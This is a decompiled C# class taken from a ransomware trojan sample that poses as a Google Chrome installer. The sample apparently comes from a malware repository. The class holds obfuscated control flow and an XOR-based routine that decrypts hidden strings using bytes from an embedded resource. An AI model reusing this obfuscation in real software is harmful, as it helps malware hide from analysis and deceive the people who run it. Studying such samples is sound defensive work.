// Decompiled with JetBrains decompiler
// Type: Ⴄ.Ⴜ
// Assembly: Google Chrome Full Version, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8024666E-1682-4571-A2AC-033F4530F911
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-b772a931021ad63094de28fb08477220cef8fdf31237fb24fb8c08d4bca34175.exe

using j;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Ⴄ
{
  internal sealed class Ⴜ
  {
    internal static ႰႭ Ⴅ;
    internal static byte[] Ⴗ;

    public static string Ⴓ([In] string obj0, [In] int obj1)
    {
      char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
      int num = !pebdynyveq.Ⴍ(iolzjmgwdl.Ⴅ(855, (short) 880), new DateTime(635760050538118688L), 'Ό', 'ϼ') ? (int) ⴃ[190] - 65200 : 6;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
          case 4:
          case 5:
            goto label_3;
          case 3:
            goto label_5;
          case 6:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴜ.Ⴓ);
            num = 0;
            continue;
        }
      }
label_4:
      throw new Exception();
label_5:
      return string.Intern(Ⴜ.Ⴐ.Ⴓ.Ⴃ(obj0, obj1));
    }

    [SpecialName]
    public static string Ⴈ()
    {
      char[] ⴃ = nqcpjoekzw.Ⴃ;
      return ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(8, '\'', 515358883), 60968), 57706);
    }

    private sealed class Ⴐ
    {
      public static readonly Ⴜ.Ⴐ Ⴓ;
      private pebdynyveq.Ⴓ Ⴗ;

      static Ⴐ()
      {
        byte[] ⴗ = Ⴜ.Ⴗ;
        int num = 0;
        while (true)
        {
          switch (num)
          {
            case 2:
              num = !pebdynyveq.Ⴍ(iolzjmgwdl.Ⴅ(121, (short) 94), new DateTime(635760050536267452L), 'Ή', 'Ϲ') ? 4 : (int) ⴗ[99] - 249;
              continue;
            case 3:
              goto label_6;
            case 4:
              goto label_5;
            case 5:
              goto label_4;
            default:
              ႰႰ.ႥႥ.Ⴈ();
              goto case 2;
          }
        }
label_6:
        return;
label_4:
        throw new Exception();
label_5:
        Ⴜ.Ⴐ.Ⴓ = new Ⴜ.Ⴐ();
      }

      private Ⴐ()
      {
        IDisposable disposable = (IDisposable) ႰႳ.Ⴓ<string, Assembly>(ႰႳ.Ⴄ(605, 'ȿ'), Ⴜ.Ⴈ(), (short) 788, (short) 793);
        if ((Stream) disposable == null)
          return;
        this.Ⴗ.Ⴅ = (Array) new byte[256] as byte[];
        (disposable as Stream).Read(this.Ⴗ.Ⴅ, 0, this.Ⴗ.Ⴅ.Length);
      }

      public string Ⴃ([In] string obj0, [In] int obj1)
      {
        byte[] ⴗ = Ⴜ.Ⴗ;
        char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
        int index1 = pebdynyveq.Ⴀ<string>(obj0, (short) 74, 125);
        int num = 9;
        Array array;
        int index2;
        while (true)
        {
          switch (num)
          {
            case 0:
              array = (Array) iolzjmgwdl.Ⴗ<string>(obj0, 809, '͌');
              num = (int) ⴗ[161];
              continue;
            case 1:
            case 2:
              goto label_10;
            case 3:
              num = (int) ⴗ[201] - (int) ⴗ[63];
              continue;
            case 4:
            case 7:
              ((char[]) array)[index1] = (char) ((uint) (array as char[])[index1] ^ ((uint) this.Ⴗ.Ⴅ[index2] | (uint) obj1));
              num = 10;
              continue;
            case 5:
            case 6:
              num = 4;
              continue;
            case 8:
              goto label_3;
            case 9:
              index2 = obj1 & (int) byte.MaxValue;
              num = 0;
              continue;
            case 10:
              num = --index1 >= 0 ? 5 : (int) ⴃ[353] - 3626;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴜ.Ⴐ.Ⴃ);
              num = 8;
              continue;
          }
        }
label_10:
        return string.Intern(new string(array as char[]));
      }
    }
  }
}
